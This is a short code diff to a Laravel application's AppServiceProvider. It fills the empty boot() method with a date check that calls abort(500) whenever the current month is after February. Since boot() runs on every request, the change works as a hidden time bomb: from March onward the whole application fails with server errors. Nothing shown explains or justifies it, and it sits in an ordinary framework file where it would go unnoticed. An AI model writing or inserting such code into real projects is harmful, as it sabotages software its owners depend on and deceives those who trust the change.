@@ -19,6 +19,9 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-        //
+        if (date('m') > 2)
+        {
+            abort(500);
+        }
     }
 }
